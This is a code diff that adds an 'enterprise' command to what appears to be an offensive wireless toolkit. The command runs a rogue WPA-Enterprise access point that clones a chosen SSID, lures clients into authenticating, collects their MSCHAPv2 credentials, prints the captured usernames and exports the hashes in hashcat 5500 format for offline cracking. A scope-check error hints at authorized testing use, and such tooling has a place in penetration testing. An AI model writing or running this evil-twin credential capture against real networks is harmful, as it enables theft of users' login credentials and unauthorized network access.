@@ -536,6 +536,60 @@ def wifi_eviltwin(
         pass
 
 
+@wifi_app.command("enterprise")
+def wifi_enterprise(
+    interface: str = typer.Argument(..., help="Interface for the rogue AP"),
+    ssid: str = typer.Argument(..., help="Enterprise SSID to clone"),
+    channel: int = typer.Argument(..., help="Channel (band derived from it)"),
+    gateway: str = typer.Option("10.0.0.1", "--gateway", "-g", help="Rogue gateway IP"),
+    output: str = typer.Option(None, "--output", "-o", help="hashcat 5500 output file"),
+):
+    """Rogue WPA-Enterprise AP: capture MSCHAPv2 creds (hashcat 5500)."""
+
+    async def run_ent():
+        from netreaper.core.exceptions import TargetValidationError
+        from netreaper.wireless.enterprise import EnterpriseAttack, export_hashcat
+
+        ent = EnterpriseAttack()
+        try:
+            try:
+                await ent.start(interface, ssid, channel, gateway_ip=gateway)
+            except TargetValidationError as exc:
+                console.print(f"[red]Denied by scope gate: {exc}[/red]")
+                raise typer.Exit(2) from exc
+            console.print(
+                f"[green]Enterprise rogue AP '{ssid}' up on {interface}. "
+                "Press Ctrl-C to stop.[/green]"
+            )
+            while True:
+                await asyncio.sleep(3600)
+        except (KeyboardInterrupt, asyncio.CancelledError):
+            pass
+        finally:
+            if ent.state is not None:
+                creds = ent.read_credentials()
+                await ent.stop()
+                console.print("[cyan]Enterprise rogue AP torn down.[/cyan]")
+                if creds:
+                    n = len(creds)
+                    console.print(f"[green]Captured {n} credential(s):[/green]")
+                    for c in creds:
+                        console.print(f"  {c.username}")
+                    hashes = export_hashcat(creds)
+                    if output:
+                        Path(output).write_text(hashes + "\n")
+                        console.print(f"hashcat 5500 written to: {output}")
+                    else:
+                        console.print(hashes)
+                else:
+                    console.print("[yellow]No credentials captured.[/yellow]")
+
+    try:
+        asyncio.run(run_ent())
+    except KeyboardInterrupt:
+        pass
+
+
 # Plugin commands
 plugin_app = typer.Typer(help="Plugin management")
 app.add_typer(plugin_app, name="plugin")
